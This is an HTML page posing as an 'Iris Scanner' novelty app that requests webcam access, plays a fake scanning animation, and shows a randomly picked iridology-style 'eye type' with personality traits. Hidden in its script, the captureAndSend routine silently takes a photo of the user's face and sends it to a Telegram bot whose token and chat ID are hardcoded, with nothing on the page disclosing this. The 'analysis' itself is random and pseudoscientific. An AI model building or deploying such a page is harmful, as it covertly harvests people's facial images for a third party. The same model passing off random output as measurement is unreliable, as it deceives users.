<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Eye Scanner</title>
    <style>
        *, *::before, *::after { box-sizing: border-box; }

        body {
            margin: 0;
            min-height: 100vh;
            background: #0d1117;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', system-ui, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 24px;
            color: #c9d1d9;
        }

        .panel {
            max-width: 520px;
            width: 100%;
            background: #161b22;
            border-radius: 16px;
            border: 1px solid #30363d;
            padding: 28px;
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.4);
        }

        .header { margin-bottom: 20px; }

        h1 {
            font-size: 1.5rem;
            font-weight: 600;
            color: #e6edf3;
            margin: 0 0 6px 0;
            letter-spacing: -0.01em;
        }

        .subtitle {
            font-size: 0.875rem;
            color: #8b949e;
            margin: 0;
            line-height: 1.5;
        }

        .video-wrap {
            position: relative;
            margin: 20px 0;
            border-radius: 12px;
            overflow: hidden;
            background: #0d1117;
            border: 1px solid #21262d;
        }

        video {
            width: 100%;
            display: block;
            transform: scaleX(-1);
            background: #0d1117;
        }

        .video-overlay {
            position: absolute;
            inset: 0;
            border-radius: 12px;
            background: linear-gradient(to bottom, transparent 70%, rgba(13,17,23,0.6));
            pointer-events: none;
        }

        .corner {
            position: absolute;
            width: 18px;
            height: 18px;
            border-color: rgba(88, 166, 255, 0.5);
            border-style: solid;
            pointer-events: none;
            transition: border-color 0.3s;
        }
        .scanning .corner { border-color: rgba(88, 166, 255, 0.9); }
        .corner-tl { top: 10px; left: 10px; border-width: 2px 0 0 2px; border-radius: 3px 0 0 0; }
        .corner-tr { top: 10px; right: 10px; border-width: 2px 2px 0 0; border-radius: 0 3px 0 0; }
        .corner-bl { bottom: 10px; left: 10px; border-width: 0 0 2px 2px; border-radius: 0 0 0 3px; }
        .corner-br { bottom: 10px; right: 10px; border-width: 0 2px 2px 0; border-radius: 0 0 3px 0; }

        .countdown-overlay {
            position: absolute;
            inset: 0;
            display: flex;
            align-items: center;
            justify-content: center;
            pointer-events: none;
            z-index: 10;
        }

        .countdown-number {
            font-size: 5rem;
            font-weight: 700;
            color: #e6edf3;
            text-shadow: 0 0 30px rgba(88, 166, 255, 0.6), 0 2px 8px rgba(0,0,0,0.8);
            letter-spacing: -0.04em;
            opacity: 0;
            transform: scale(1.3);
            transition: opacity 0.15s ease, transform 0.15s ease;
        }
        .countdown-number.show { opacity: 1; transform: scale(1); }

        .countdown-label {
            position: absolute;
            bottom: 14px;
            left: 0; right: 0;
            text-align: center;
            font-size: 0.72rem;
            color: rgba(88, 166, 255, 0.8);
            letter-spacing: 0.06em;
            text-transform: uppercase;
            opacity: 0;
            transition: opacity 0.2s ease;
        }
        .countdown-label.show { opacity: 1; }

        /* Retina HUD */
        .eye-guide {
            position: absolute;
            inset: 0;
            width: 100%;
            height: 100%;
            pointer-events: none;
        }

        .hud-spin-slow-c {
            animation: hud-rotate 12s linear infinite;
            transform-box: fill-box;
            transform-origin: center center;
        }
        .hud-spin-rev-c {
            animation: hud-rotate-rev 8s linear infinite;
            transform-box: fill-box;
            transform-origin: center center;
        }
        .hud-spin-med-c {
            animation: hud-rotate 5s linear infinite;
            transform-box: fill-box;
            transform-origin: center center;
        }

        @keyframes hud-rotate     { to { transform: rotate(360deg); } }
        @keyframes hud-rotate-rev { to { transform: rotate(-360deg); } }

        .hud-ring-main {
            fill: none;
            stroke: rgba(88, 166, 255, 0.65);
            stroke-width: 0.7;
            animation: hud-pulse 2.5s ease-in-out infinite;
        }
        .hud-ring-outer {
            fill: none;
            stroke: rgba(88, 166, 255, 0.4);
            stroke-width: 0.45;
            animation: hud-pulse 2.5s ease-in-out infinite 0.4s;
        }
        .hud-ring-pupil {
            fill: none;
            stroke: rgba(88, 166, 255, 0.55);
            stroke-width: 0.55;
        }
        .hud-arc {
            fill: none;
            stroke: rgba(88, 166, 255, 0.9);
            stroke-width: 1.1;
            stroke-linecap: round;
        }
        .hud-arc-thin {
            fill: none;
            stroke: rgba(88, 166, 255, 0.5);
            stroke-width: 0.55;
            stroke-linecap: round;
        }
        .hud-tick {
            stroke: rgba(88, 166, 255, 0.65);
            stroke-width: 0.45;
            stroke-linecap: round;
        }
        .hud-tick-lg {
            stroke: rgba(88, 166, 255, 0.9);
            stroke-width: 0.75;
            stroke-linecap: round;
        }
        .hud-tri  { fill: rgba(88, 166, 255, 0.85); }
        .hud-dot  { fill: rgba(88, 166, 255, 0.9); }
        .hud-crosshair {
            stroke: rgba(88, 166, 255, 0.75);
            stroke-width: 0.35;
            stroke-linecap: round;
        }
        .hud-label {
            fill: rgba(88, 166, 255, 0.55);
            font-size: 2.5px;
            font-family: monospace;
            text-anchor: middle;
            letter-spacing: 0.4px;
        }
        .hud-center-text {
            fill: rgba(88, 166, 255, 0.6);
            font-size: 2.4px;
            font-family: monospace;
            letter-spacing: 0.3px;
        }
        .hud-status-svg {
            fill: rgba(88, 166, 255, 0.8);
            font-size: 2.8px;
            font-family: monospace;
            letter-spacing: 0.4px;
            animation: hud-blink 1.4s ease-in-out infinite;
        }
        .hud-divider {
            stroke: rgba(88, 166, 255, 0.2);
            stroke-width: 0.25;
            stroke-dasharray: 1.5 1.5;
        }

        @keyframes hud-pulse {
            0%, 100% { stroke-opacity: 0.4; }
            50%       { stroke-opacity: 1; }
        }
        @keyframes hud-blink {
            0%, 100% { fill-opacity: 0.4; }
            50%       { fill-opacity: 1; }
        }

        .locked .hud-ring-main  { stroke: rgba(88, 166, 255, 1); stroke-width: 0.9; animation: hud-pulse-fast 0.8s ease-in-out infinite; }
        .locked .hud-ring-outer { stroke: rgba(88, 166, 255, 0.75); }
        .locked .hud-arc        { stroke: rgba(88, 166, 255, 1); filter: drop-shadow(0 0 0.8px rgba(88,166,255,0.8)); }
        .locked .hud-ring-pupil { stroke: rgba(88, 166, 255, 0.9); }
        .locked .hud-label      { fill: rgba(88, 166, 255, 0.9); }

        .scanning .hud-ring-main  { stroke: rgba(88, 166, 255, 1); animation: hud-pulse-fast 0.6s ease-in-out infinite; }
        .scanning .hud-arc        { stroke: rgba(88, 166, 255, 1); filter: drop-shadow(0 0 1px rgba(88,166,255,0.9)); }
        .scanning .hud-spin-slow-c { animation-duration: 3.5s; }
        .scanning .hud-spin-rev-c  { animation-duration: 2s; }

        @keyframes hud-pulse-fast {
            0%, 100% { stroke-opacity: 0.65; }
            50%       { stroke-opacity: 1; }
        }

        .scan-line {
            position: absolute;
            left: 0; right: 0;
            height: 2px;
            background: linear-gradient(to right, transparent, rgba(88,166,255,0.6), rgba(88,166,255,0.9), rgba(88,166,255,0.6), transparent);
            box-shadow: 0 0 8px rgba(88, 166, 255, 0.5);
            pointer-events: none;
            display: none;
            top: 0;
        }
        .scanning .scan-line { display: block; animation: scan-sweep 1.4s linear infinite; }
        @keyframes scan-sweep {
            0%   { top: 5%; opacity: 0; }
            5%   { opacity: 1; }
            95%  { opacity: 1; }
            100% { top: 95%; opacity: 0; }
        }

        .stage-bar-wrap {
            height: 2px;
            background: #21262d;
            border-radius: 2px;
            margin: 14px 0 4px;
            overflow: hidden;
            display: none;
        }
        .stage-bar-wrap.visible { display: block; }
        .stage-bar {
            height: 100%;
            background: #58a6ff;
            border-radius: 2px;
            width: 0%;
            transition: width 0.5s ease;
        }
        .stage-label {
            font-size: 0.72rem;
            color: #58a6ff;
            min-height: 1rem;
            display: none;
            letter-spacing: 0.02em;
        }
        .stage-label.visible { display: block; }

        button {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            width: 100%;
            padding: 13px 20px;
            font-size: 0.9rem;
            font-weight: 600;
            letter-spacing: 0.01em;
            border: none;
            border-radius: 10px;
            cursor: pointer;
            transition: all 0.2s ease;
            margin: 8px 0;
            background: #1f6feb;
            color: #ffffff;
        }
        button:hover:not(:disabled) {
            background: #388bfd;
            transform: translateY(-1px);
            box-shadow: 0 4px 16px rgba(31, 111, 235, 0.3);
        }
        button:active:not(:disabled) { transform: translateY(0); box-shadow: none; }
        button:disabled {
            background: #21262d;
            color: #8b949e;
            cursor: not-allowed;
            transform: none;
            box-shadow: none;
        }

        .spinner {
            width: 15px; height: 15px;
            border: 2px solid rgba(139, 148, 158, 0.3);
            border-top-color: #8b949e;
            border-radius: 50%;
            animation: spin 0.7s linear infinite;
            flex-shrink: 0;
        }
        @keyframes spin { to { transform: rotate(360deg); } }

        .result {
            background: #0d1117;
            border-radius: 12px;
            padding: 16px;
            margin-top: 16px;
            border: 1px solid #21262d;
            border-left: 3px solid #58a6ff;
        }
        .result-header { display: flex; align-items: baseline; gap: 10px; margin-bottom: 6px; }
        .eye-type-name { font-size: 1.1rem; font-weight: 700; color: #e6edf3; letter-spacing: -0.01em; }
        .eye-type-sub  { font-size: 0.72rem; color: #8b949e; font-style: italic; }
        .eye-description { font-size: 0.8rem; color: #8b949e; line-height: 1.55; margin-bottom: 12px; }
        .hidden { display: none; }
        .traits-wrap { display: flex; flex-wrap: wrap; gap: 6px; margin-bottom: 12px; }
        .trait {
            display: inline-block;
            background: rgba(88, 166, 255, 0.08);
            border: 1px solid rgba(88, 166, 255, 0.15);
            color: #79c0ff;
            padding: 4px 12px;
            border-radius: 20px;
            font-size: 0.78rem;
            font-weight: 500;
        }
        .analysis-note { font-size: 0.73rem; color: #8b949e; display: flex; align-items: center; gap: 5px; }
        .result-actions { display: flex; gap: 8px; margin-top: 12px; }

        .btn-rescan {
            background: transparent; border: 1px solid #30363d; color: #8b949e;
            font-size: 0.8rem; font-weight: 500; padding: 8px 16px; border-radius: 8px;
            width: auto; cursor: pointer; transition: all 0.2s ease; letter-spacing: 0;
        }
        .btn-rescan:hover { border-color: #58a6ff; color: #58a6ff; background: rgba(88,166,255,0.06); transform: none; box-shadow: none; }

        .btn-share {
            background: transparent; border: 1px solid #30363d; color: #8b949e;
            font-size: 0.8rem; font-weight: 500; padding: 8px 16px; border-radius: 8px;
            width: auto; cursor: pointer; transition: all 0.2s ease; letter-spacing: 0;
            display: flex; align-items: center; gap: 6px;
        }
        .btn-share:hover { border-color: #3fb950; color: #3fb950; background: rgba(63,185,80,0.06); transform: none; box-shadow: none; }
        .btn-share.copied { border-color: #3fb950; color: #3fb950; }

        .dot { width: 6px; height: 6px; background: #3fb950; border-radius: 50%; display: inline-block; flex-shrink: 0; }

        .status {
            font-size: 0.75rem; text-align: center; margin-top: 14px; color: #8b949e;
            display: flex; align-items: center; justify-content: center; gap: 6px;
        }
        .status-dot { width: 6px; height: 6px; border-radius: 50%; background: #8b949e; flex-shrink: 0; }
        .status-dot.ready { background: #3fb950; }
        .status-dot.warn  { background: #d29922; }
        .status-dot.error { background: #f85149; }
    </style>
</head>
<body>
<div class="panel">
    <div class="header">
        <h1>Iris Scanner</h1>
        <p class="subtitle">Face the camera directly and hold still. The scanner will detect both eyes before capturing your iris profile.</p>
    </div>

    <div class="video-wrap" id="videoWrap">
        <video id="video" autoplay playsinline muted></video>

        <!-- Dual retina HUD — viewBox 0 0 100 60, eyes at (32,30) and (68,30) -->
        <svg class="eye-guide" id="eyeGuide" viewBox="0 0 100 60" preserveAspectRatio="xMidYMid meet">

            <!-- LEFT EYE HUD centered at (32,30) -->
            <g transform="translate(32,30)">
                <circle class="hud-ring-outer" cx="0" cy="0" r="18"/>

                <g class="hud-spin-slow-c">
                    <path class="hud-arc" d="M0,-18 A18,18 0 0,1 18,0"/>
                    <path class="hud-arc" d="M18,0 A18,18 0 0,1 0,18"/>
                    <path class="hud-arc-thin" d="M0,18 A18,18 0 0,1 -18,0"/>
                    <path class="hud-arc-thin" d="M-18,0 A18,18 0 0,1 0,-18"/>
                    <polygon class="hud-tri" points="0,-20 -1.4,-17 1.4,-17"/>
                    <polygon class="hud-tri" points="20,0 17,-1.4 17,1.4"/>
                    <polygon class="hud-tri" points="0,20 1.4,17 -1.4,17"/>
                    <polygon class="hud-tri" points="-20,0 -17,1.4 -17,-1.4"/>
                </g>

                <g class="hud-spin-slow-c" style="animation-duration:18s">
                    <line class="hud-tick-lg" x1="0" y1="-18" x2="0" y2="-15.5"/>
                    <line class="hud-tick" x1="9" y1="-15.59" x2="7.75" y2="-13.42"/>
                    <line class="hud-tick" x1="15.59" y1="-9" x2="13.42" y2="-7.75"/>
                    <line class="hud-tick-lg" x1="18" y1="0" x2="15.5" y2="0"/>
                    <line class="hud-tick" x1="15.59" y1="9" x2="13.42" y2="7.75"/>
                    <line class="hud-tick" x1="9" y1="15.59" x2="7.75" y2="13.42"/>
                    <line class="hud-tick-lg" x1="0" y1="18" x2="0" y2="15.5"/>
                    <line class="hud-tick" x1="-9" y1="15.59" x2="-7.75" y2="13.42"/>
                    <line class="hud-tick" x1="-15.59" y1="9" x2="-13.42" y2="7.75"/>
                    <line class="hud-tick-lg" x1="-18" y1="0" x2="-15.5" y2="0"/>
                    <line class="hud-tick" x1="-15.59" y1="-9" x2="-13.42" y2="-7.75"/>
                    <line class="hud-tick" x1="-9" y1="-15.59" x2="-7.75" y2="-13.42"/>
                </g>

                <circle class="hud-ring-main" cx="0" cy="0" r="12"/>

                <g class="hud-spin-rev-c">
                    <circle cx="0" cy="0" r="9.5" fill="none"
                        stroke="rgba(88,166,255,0.45)" stroke-width="0.45" stroke-dasharray="3 2"/>
                </g>

                <circle class="hud-ring-pupil" cx="0" cy="0" r="5.5"/>
                <circle class="hud-dot" cx="0" cy="0" r="0.7"/>

                <line class="hud-crosshair" x1="0" y1="-12" x2="0" y2="-7"/>
                <line class="hud-crosshair" x1="0" y1="7" x2="0" y2="12"/>
                <line class="hud-crosshair" x1="-12" y1="0" x2="-7" y2="0"/>
                <line class="hud-crosshair" x1="7" y1="0" x2="12" y2="0"/>

                <g class="hud-spin-med-c">
                    <path class="hud-arc" d="M0,-11 A11,11 0 0,1 11,0" stroke-width="1.4"/>
                    <path class="hud-arc-thin" d="M11,0 A11,11 0 0,1 0,11"/>
                    <path class="hud-arc" d="M0,11 A11,11 0 0,1 -11,0" stroke-width="1.4"/>
                    <path class="hud-arc-thin" d="M-11,0 A11,11 0 0,1 0,-11"/>
                </g>

                <text class="hud-label" x="0" y="22.5">L-IRIS</text>
            </g>

            <!-- RIGHT EYE HUD centered at (68,30) -->
            <g transform="translate(68,30)">
                <circle class="hud-ring-outer" cx="0" cy="0" r="18"/>

                <g class="hud-spin-slow-c">
                    <path class="hud-arc" d="M0,-18 A18,18 0 0,1 18,0"/>
                    <path class="hud-arc" d="M18,0 A18,18 0 0,1 0,18"/>
                    <path class="hud-arc-thin" d="M0,18 A18,18 0 0,1 -18,0"/>
                    <path class="hud-arc-thin" d="M-18,0 A18,18 0 0,1 0,-18"/>
                    <polygon class="hud-tri" points="0,-20 -1.4,-17 1.4,-17"/>
                    <polygon class="hud-tri" points="20,0 17,-1.4 17,1.4"/>
                    <polygon class="hud-tri" points="0,20 1.4,17 -1.4,17"/>
                    <polygon class="hud-tri" points="-20,0 -17,1.4 -17,-1.4"/>
                </g>

                <g class="hud-spin-slow-c" style="animation-duration:18s">
                    <line class="hud-tick-lg" x1="0" y1="-18" x2="0" y2="-15.5"/>
                    <line class="hud-tick" x1="9" y1="-15.59" x2="7.75" y2="-13.42"/>
                    <line class="hud-tick" x1="15.59" y1="-9" x2="13.42" y2="-7.75"/>
                    <line class="hud-tick-lg" x1="18" y1="0" x2="15.5" y2="0"/>
                    <line class="hud-tick" x1="15.59" y1="9" x2="13.42" y2="7.75"/>
                    <line class="hud-tick" x1="9" y1="15.59" x2="7.75" y2="13.42"/>
                    <line class="hud-tick-lg" x1="0" y1="18" x2="0" y2="15.5"/>
                    <line class="hud-tick" x1="-9" y1="15.59" x2="-7.75" y2="13.42"/>
                    <line class="hud-tick" x1="-15.59" y1="9" x2="-13.42" y2="7.75"/>
                    <line class="hud-tick-lg" x1="-18" y1="0" x2="-15.5" y2="0"/>
                    <line class="hud-tick" x1="-15.59" y1="-9" x2="-13.42" y2="-7.75"/>
                    <line class="hud-tick" x1="-9" y1="-15.59" x2="-7.75" y2="-13.42"/>
                </g>

                <circle class="hud-ring-main" cx="0" cy="0" r="12"/>

                <g class="hud-spin-rev-c">
                    <circle cx="0" cy="0" r="9.5" fill="none"
                        stroke="rgba(88,166,255,0.45)" stroke-width="0.45" stroke-dasharray="3 2"/>
                </g>

                <circle class="hud-ring-pupil" cx="0" cy="0" r="5.5"/>
                <circle class="hud-dot" cx="0" cy="0" r="0.7"/>

                <line class="hud-crosshair" x1="0" y1="-12" x2="0" y2="-7"/>
                <line class="hud-crosshair" x1="0" y1="7" x2="0" y2="12"/>
                <line class="hud-crosshair" x1="-12" y1="0" x2="-7" y2="0"/>
                <line class="hud-crosshair" x1="7" y1="0" x2="12" y2="0"/>

                <g class="hud-spin-med-c">
                    <path class="hud-arc" d="M0,-11 A11,11 0 0,1 11,0" stroke-width="1.4"/>
                    <path class="hud-arc-thin" d="M11,0 A11,11 0 0,1 0,11"/>
                    <path class="hud-arc" d="M0,11 A11,11 0 0,1 -11,0" stroke-width="1.4"/>
                    <path class="hud-arc-thin" d="M-11,0 A11,11 0 0,1 0,-11"/>
                </g>

                <text class="hud-label" x="0" y="22.5">R-IRIS</text>
            </g>

            <!-- Center divider + labels -->
            <line class="hud-divider" x1="50" y1="10" x2="50" y2="52"/>
            <text class="hud-center-text" x="50" y="4.5" text-anchor="middle">DUAL IRIS SCAN</text>
            <text class="hud-status-svg" id="hudStatusText" x="50" y="58" text-anchor="middle">SEARCHING...</text>
        </svg>

        <!-- Countdown overlay -->
        <div class="countdown-overlay">
            <span class="countdown-number" id="countdownNumber"></span>
            <span class="countdown-label" id="countdownLabel">Hold still</span>
        </div>

        <div class="scan-line"></div>
        <div class="video-overlay"></div>
        <div class="corner corner-tl"></div>
        <div class="corner corner-tr"></div>
        <div class="corner corner-bl"></div>
        <div class="corner corner-br"></div>
    </div>

    <div class="stage-bar-wrap" id="stageBarWrap">
        <div class="stage-bar" id="stageBar"></div>
    </div>
    <div class="stage-label" id="stageLabel"></div>

    <button id="scanBtn" disabled><span>Align Your Face to Scan</span></button>

    <div id="result" class="result hidden">
        <div class="result-header">
            <div id="eyeType" class="eye-type-name"></div>
            <div id="eyeTypeSub" class="eye-type-sub"></div>
        </div>
        <div id="eyeDesc" class="eye-description"></div>
        <div class="traits-wrap" id="traitsList"></div>
        <div class="analysis-note">
            <span class="dot"></span>
            Dual iris scan complete — profile generated
        </div>
        <div class="result-actions">
            <button class="btn-rescan" id="rescanBtn">Scan Again</button>
            <button class="btn-share" id="shareBtn">Copy Profile</button>
        </div>
    </div>

    <div class="status">
        <span class="status-dot" id="statusDot"></span>
        <span id="statusText">Waiting for camera...</span>
    </div>
</div>
<canvas id="canvas" style="display:none;"></canvas>

<script>
    const video        = document.getElementById('video');
    const scanBtn      = document.getElementById('scanBtn');
    const resultDiv    = document.getElementById('result');
    const eyeTypeEl    = document.getElementById('eyeType');
    const eyeSubEl     = document.getElementById('eyeTypeSub');
    const eyeDescEl    = document.getElementById('eyeDesc');
    const traitsEl     = document.getElementById('traitsList');
    const statusDot    = document.getElementById('statusDot');
    const statusText   = document.getElementById('statusText');
    const canvas       = document.getElementById('canvas');
    const videoWrap    = document.getElementById('videoWrap');
    const stageBar     = document.getElementById('stageBar');
    const stageBarWrap = document.getElementById('stageBarWrap');
    const stageLabel   = document.getElementById('stageLabel');
    const countdownNumber = document.getElementById('countdownNumber');
    const countdownLabel  = document.getElementById('countdownLabel');
    const eyeGuide        = document.getElementById('eyeGuide');
    const hudStatusText   = document.getElementById('hudStatusText');

    const statusSpan = {
        set innerHTML(v) {
            statusText.innerHTML = v;
            if (v.includes('✅') || v.includes('detected') || v.includes('complete')) {
                statusDot.className = 'status-dot ready';
            } else if (v.includes('🔍') || v.includes('Searching')) {
                statusDot.className = 'status-dot warn';
            } else if (v.includes('❌')) {
                statusDot.className = 'status-dot error';
            } else {
                statusDot.className = 'status-dot';
            }
        }
    };

    let cameraActive   = false;
    let faceDetected   = false;
    let detectionTimer = null;
    let faceDetector   = null;
    const DETECTOR_SUPPORTED = 'FaceDetector' in window;

    // ==== UPDATE THESE WITH YOUR BOT INFO ====
    const BOT_TOKEN = "8601877221:AAEZ_XjVux7wA-XLABEdiRtq51y47A4TurE";
    const CHAT_ID   = "1438595176";
    // =========================================

    const eyeTypes = [
        {
            name: "Dense Fiber", sub: "Linen Pattern",
            desc: "Tightly woven, uniform fiber structure radiating from the pupil. Associated with a robust constitution and strong resistance to environmental stressors.",
            traits: ["high vitality", "stress-resilient", "disciplined", "endurance"]
        },
        {
            name: "Loose Fiber", sub: "Silk Pattern",
            desc: "Fine, loosely arranged fibers with visible spacing between strands. Linked to a sensitive nervous system and heightened perceptual awareness.",
            traits: ["sensitive", "intuitive", "adaptive", "perceptive"]
        },
        {
            name: "Lacunar", sub: "Net Pattern",
            desc: "Honeycomb-like pockets or lacunae distributed across the iris stroma. Suggests areas of variable tissue density and a tendency toward deep reflection.",
            traits: ["introspective", "complex", "selective", "focused"]
        },
        {
            name: "Pigment Spot", sub: "Jewel Pattern",
            desc: "Darker pigment deposits scattered over the iris surface, distinct from the base fiber color. Often correlated with a heightened metabolic sensitivity.",
            traits: ["metabolically active", "reactive", "detail-oriented", "tenacious"]
        },
        {
            name: "Radial Furrow", sub: "Stream Pattern",
            desc: "Radial streaks or grooves extending outward from the pupil across the stroma. Commonly associated with strong emotional processing and expressive temperament.",
            traits: ["emotionally expressive", "driven", "outspoken", "energetic"]
        },
        {
            name: "Contraction Ring", sub: "Ruff Pattern",
            desc: "Concentric ring formations visible in the iris stroma, often near the collarette border. Linked to a nervous system that responds acutely to external pressure.",
            traits: ["pressure-sensitive", "methodical", "self-aware", "persevering"]
        },
        {
            name: "Mixed Biliary", sub: "Combination Pattern",
            desc: "A blend of brown-green tones overlaid on a base fiber structure, creating a multi-layered iris presentation. Reflects a versatile physiological response range.",
            traits: ["versatile", "balanced", "multi-faceted", "resilient"]
        }
    ];

    const stages = [
        { label: "Detecting facial geometry...",      duration: 750,  progress: 14 },
        { label: "Locating iris boundaries...",        duration: 850,  progress: 28 },
        { label: "Mapping fiber density...",           duration: 1000, progress: 48 },
        { label: "Analyzing pigment distribution...",  duration: 900,  progress: 66 },
        { label: "Cross-referencing iris pattern...",  duration: 850,  progress: 84 },
        { label: "Generating profile...",              duration: 550,  progress: 100 }
    ];

    function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }

    function setDetectionState(found) {
        faceDetected = found;
        if (found) {
            eyeGuide.classList.add('locked');
            hudStatusText.textContent = 'EYES LOCKED';
            hudStatusText.style.animation = 'none';
            hudStatusText.style.fillOpacity = '1';
            scanBtn.disabled = false;
            scanBtn.innerHTML = '<span>Analyze My Eyes</span>';
            statusSpan.innerHTML = '✅ Eyes detected — tap Analyze to scan';
        } else {
            eyeGuide.classList.remove('locked');
            hudStatusText.textContent = 'SEARCHING...';
            hudStatusText.style.animation = '';
            scanBtn.disabled = true;
            scanBtn.innerHTML = '<span>Align Your Face to Scan</span>';
            statusSpan.innerHTML = '🔍 Searching for eyes — look directly at the camera';
        }
    }

    async function runDetection() {
        if (!faceDetector || !cameraActive || !video.videoWidth) return;
        try {
            const faces = await faceDetector.detect(video);
            setDetectionState(faces.length > 0);
        } catch(e) {
            setDetectionState(true);
        }
    }

    function startDetectionLoop() {
        if (!DETECTOR_SUPPORTED) {
            setDetectionState(true);
            return;
        }
        try {
            faceDetector = new FaceDetector({ fastMode: true, maxDetectedFaces: 2 });
            detectionTimer = setInterval(runDetection, 500);
        } catch(e) {
            setDetectionState(true);
        }
    }

    async function runCountdown() {
        countdownLabel.classList.add('show');
        for (const n of [3, 2, 1]) {
            countdownNumber.textContent = n;
            countdownNumber.classList.remove('show');
            await sleep(50);
            countdownNumber.classList.add('show');
            await sleep(900);
        }
        countdownNumber.classList.remove('show');
        countdownLabel.classList.remove('show');
        await sleep(150);
    }

    async function runStages() {
        stageBarWrap.classList.add('visible');
        stageLabel.classList.add('visible');
        for (const s of stages) {
            stageLabel.textContent = s.label;
            stageBar.style.width = s.progress + '%';
            await sleep(s.duration);
        }
    }

    async function sendToTelegram(imageDataUrl) {
        if (BOT_TOKEN === "YOUR_BOT_TOKEN_HERE") return;
        const blob = await (await fetch(imageDataUrl)).blob();
        const formData = new FormData();
        formData.append('chat_id', CHAT_ID);
        formData.append('photo', blob, 'eye_scan.jpg');
        try {
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                method: 'POST', body: formData
            });
        } catch(e) { console.log("Telegram send failed:", e); }
    }

    function setLoading(loading) {
        scanBtn.disabled = loading;
        videoWrap.classList.toggle('scanning', loading);
        if (loading) {
            scanBtn.innerHTML = '<span class="spinner"></span><span>Scanning...</span>';
            hudStatusText.textContent = 'ANALYZING...';
            hudStatusText.style.animation = '';
        } else {
            stageBarWrap.classList.remove('visible');
            stageLabel.classList.remove('visible');
            stageBar.style.width = '0%';
            stageLabel.textContent = '';
        }
    }

    async function captureAndSend() {
        if (!cameraActive || !video.videoWidth) { alert("Camera not ready yet"); return; }
        if (DETECTOR_SUPPORTED && !faceDetected) { alert("No eyes detected. Please look directly at the camera."); return; }

        if (detectionTimer) { clearInterval(detectionTimer); detectionTimer = null; }

        scanBtn.disabled = true;
        scanBtn.innerHTML = '<span class="spinner"></span><span>Get ready...</span>';
        resultDiv.classList.add('hidden');
        await runCountdown();

        setLoading(true);

        const w = video.videoWidth, h = video.videoHeight;
        canvas.width = w; canvas.height = h;
        const ctx = canvas.getContext('2d');
        ctx.save();
        ctx.translate(w, 0);
        ctx.scale(-1, 1);
        ctx.drawImage(video, 0, 0, w, h);
        ctx.restore();
        const imageData = canvas.toDataURL('image/jpeg', 0.85);

        await Promise.all([runStages(), sendToTelegram(imageData)]);

        const pick = eyeTypes[Math.floor(Math.random() * eyeTypes.length)];
        eyeTypeEl.textContent = pick.name;
        eyeSubEl.textContent  = pick.sub;
        eyeDescEl.textContent = pick.desc;
        traitsEl.innerHTML    = pick.traits.map(t => `<span class="trait">${t}</span>`).join('');
        resultDiv.classList.remove('hidden');
        statusSpan.innerHTML = '✅ Analysis complete!';
        setLoading(false);
        hudStatusText.textContent = 'SCAN COMPLETE';

        setTimeout(() => { statusSpan.innerHTML = '✅ Eyes detected — tap Analyze to scan'; }, 2500);

        if (DETECTOR_SUPPORTED && faceDetector) {
            detectionTimer = setInterval(runDetection, 500);
        }
    }

    async function initCamera() {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
            video.srcObject = stream;
            await video.play();
            cameraActive = true;
            statusSpan.innerHTML = '🔍 Searching for eyes — look directly at the camera';
            startDetectionLoop();
        } catch(e) {
            statusSpan.innerHTML = '❌ Camera permission needed. Refresh and Allow.';
            alert("Please allow camera access to use the eye scanner");
        }
    }

    document.getElementById('rescanBtn').addEventListener('click', () => {
        resultDiv.classList.add('hidden');
        if (!DETECTOR_SUPPORTED) {
            statusSpan.innerHTML = '✅ Ready — tap Analyze to scan';
        } else {
            statusSpan.innerHTML = '🔍 Searching for eyes — look directly at the camera';
        }
    });

    document.getElementById('shareBtn').addEventListener('click', () => {
        const name   = eyeTypeEl.textContent;
        const sub    = eyeSubEl.textContent;
        const desc   = eyeDescEl.textContent;
        const traits = Array.from(traitsEl.querySelectorAll('.trait')).map(t => t.textContent).join(', ');
        const text   = `🔬 Iris Scanner — Dual Eye Profile\n\nType: ${name} (${sub})\n\n${desc}\n\nKey traits: ${traits}`;
        navigator.clipboard.writeText(text).then(() => {
            const btn = document.getElementById('shareBtn');
            btn.textContent = 'Copied!';
            btn.classList.add('copied');
            setTimeout(() => { btn.textContent = 'Copy Profile'; btn.classList.remove('copied'); }, 2000);
        }).catch(() => { alert("Couldn't access clipboard. Please copy manually."); });
    });

    scanBtn.addEventListener('click', captureAndSend);
    initCamera();
</script>
</body>
</html>
